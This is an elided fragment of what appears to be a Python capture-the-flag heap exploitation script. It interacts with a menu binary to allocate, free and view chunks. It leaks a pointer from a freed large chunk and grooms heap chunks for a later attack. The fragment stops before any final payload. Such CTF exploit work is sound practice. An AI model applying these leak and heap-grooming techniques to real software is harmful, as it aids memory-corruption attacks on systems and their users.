...
def malloc(ind, size, payload):
    ...
    print_payload(str(ind).encode() + b"\n")
    r3 = p.sendlineafter(b">", str(size))
    print_payload(str(size).encode() + b"\n")
    r4 = p.sendlineafter(b">",payload)
    print_payload(payload + b"\n")
    return r1+r2+r3+r4
...
print(malloc(50, 0x420, b"hi there"))
print(malloc(51, 24, b"smol"))
print(free(50))
raw = view(50)
leakr=raw[1:].split(b"\n")[0]
...
malloc(0, 0x368, b"chunk0")
malloc(1, 0x368, b"chunk1")
malloc(2, 0x378, b"chunk2")
malloc(3, 0x378, b"chunk3")
malloc(4, 24, b"smol2")
free(0)
free(1)
free(2)
...
malloc(5, 0x368, b"junk")
malloc(6, 0x378, b"junk2")
print("wait for it...")
